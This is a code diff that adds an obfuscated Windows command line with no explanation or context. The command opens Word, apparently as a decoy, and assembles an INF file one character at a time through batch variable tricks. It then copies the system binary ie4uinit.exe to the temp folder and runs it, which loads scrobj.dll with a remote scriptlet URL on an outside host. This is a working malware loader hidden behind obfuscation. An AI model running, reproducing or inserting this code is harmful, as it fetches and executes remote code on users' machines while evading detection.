@@ -1,0 +1,16 @@
+/v /c start "" "C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" & (for %j in ("cultella=se" "future=c" "wuran=e" "ana=et" "utah=l" ) do @set %~j) &&
+  call(for %f in ("d") do @set "nicke=%~f") &&
+  callcallcall(for %n in ("]") do @set "whincha=%~n") &&
+  callcallcallcallcallcall(for %u in ("u") do @set "unspad=%~u") &&
+  (for %t in ("s") do @set "mandatory=%~t") &&
+  callcallcallcallcall(for %w in ("4") do @set "queeryac=%~w") &&
+  callcall(for %d in ("\") do @set "nat=%~d") &&
+  (for %i in (".") do @set "untr=%~i") &&
+  (for %h in ("d") do @set "nicke=%~h") &&
+  call(for %y in ("m") do @set "infau=%~y") &&
+  (for %h in ("R") do @set "desinenc=%~h") &&
+  call(for %x in ("i") do @set "cint=%~x") &&
+  callcallcallcall(for %j in ("t") do @set "creas=%~j") &&
+  (for %d in ("[version]" "signature=$windowsnt$" "[9DA]" "i%conjugable%u%cudsps%n%cudsps%t%ascell%i%stormtig%f" "[defaultinstall.windows7]" "delfiles=9DA" "Un\" "Register\" "OCXs=apa_C90F47" "[strings]" "servicename= 'terrar'" "shortsvcname= 'terrar'" "ascell=." "syndesmo=/" "heptap=N" "sentencingh=b" "syllabari=c" "unsnapspa=d" "conjugable=e" "cudsps=i" "undis=j" "cockiesor=k" "discinct=l" "sybari=m" "stormtig=n" "delphocurar=o" "wais=p" "viresc=s" "coext=t" "zymosthe=u" "[apa_C90F47]" "s%syllabari%r%delphocurar%b\" "%undis%.%unsnapspa%l%discinct%,%heptap%I,h%coext%t%wais%:%syndesmo%/%viresc%f%stormtig%f%viresc%h%cudsps%.%cockiesor%a%coext%h%conjugable%r%cudsps%n%conjugable%h%zymosthe%t%syllabari%h%conjugable%n%viresc%.%syllabari%o%sybari%/%sybari%a%cockiesor%e%cudsps%t%sentencingh%e%coext%t%conjugable%r" "[destinationdirs]" "defaultdestdir=11" "9DA=01" ) do @echo %~d) > "%temp%\ieuinit.inf" &&
+  call xcopy /Y /C /Q %windir%\system32\ie4uinit.exe "%temp%" &&
+  start " " %temp%\ie4uinit.exe -basesettings
